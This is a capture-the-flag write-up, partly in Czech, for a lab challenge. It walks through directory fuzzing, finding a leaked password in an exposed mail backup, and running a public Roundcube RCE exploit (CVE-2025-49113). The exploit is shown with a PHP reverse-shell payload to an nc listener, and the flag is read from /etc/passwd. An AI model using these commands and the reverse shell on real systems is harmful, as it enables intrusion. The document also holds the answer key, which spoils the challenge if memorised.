# Temporary webmail (3)

## Zadání

Hi, emergency troubleshooter,

the e-mail administrator, Bob, was tasked with hastily setting up a new webmail server for temporary access to old e-mails. Verify whether the server is properly secured (you know how it usually goes with temporary services).

Stay grounded!

* Webmail runs on server `webmail.powergrid.tcc`.

## Nápovědy (Hints)

1. IT department is known for using disposable test accounts `ADM40090`, `ADM40091`, `ADM40092` up to `ADM40099`.

## Řešení

Webová stránka serveru ze zadání zobrazí přihlašovací dialog a informaci o tom, že technologie Webmail serveru je Roundcube.

Použitá verze Roundcube obsahuje chybu CVE-2025-49113 umožňující přihlášenému uživateli vzdálené spuštění kódu. Je možné použít exploit

<https://github.com/hakaioffsec/CVE-2025-49113-exploit>

Potřebujeme ale získat přihlašovací údaje. Podíváme se, jestli nejsou na serveru nějaké zajímavé adresáře.

`ffuf -u http://webmail.powergrid.tcc/FUZZ -w /usr/share/dirb/wordlists/common.txt`

```text
backup                  [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 7ms]
index.php               [Status: 200, Size: 5327, Words: 366, Lines: 97, Duration: 14ms]
plugins                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 10ms]
program                 [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 14ms]
skins                   [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 8ms]
```

Zajímavý je adresář `http://webmail.powergrid.tcc/backup/`, který obsahuje soubor `maildir-20150507.tgz` se zálohou mail adresářů.

V souboru `maildir\dorland-c\discussion_threads\175.` je pak informace o uživateli `ADM40092` a hesle `WELCOME6`.

Na vlastním PC spustíme poslouchání na portu 4444.

`nc -vlnp 4444`

a spustíme exploit

`php CVE-2025-49113.php http://webmail.powergrid.tcc ADM40092 WELCOME6 'php -r '\'' $sock=fsockopen("10.200.0.91",4444);exec("sh <&3 >&3 2>&3");'\''' `

Hledaný FLAG se skrývá v `/etc/passwd`.

```text
flag:x:65535:65535:RkxBR3tXbThuLXQ1cWUteEhueS1nNEdPfQ==:/nonexistent:/usr/sbin/nologin
```

## Flag

`FLAG{Wm8n-t5qe-xHny-g4GO}`
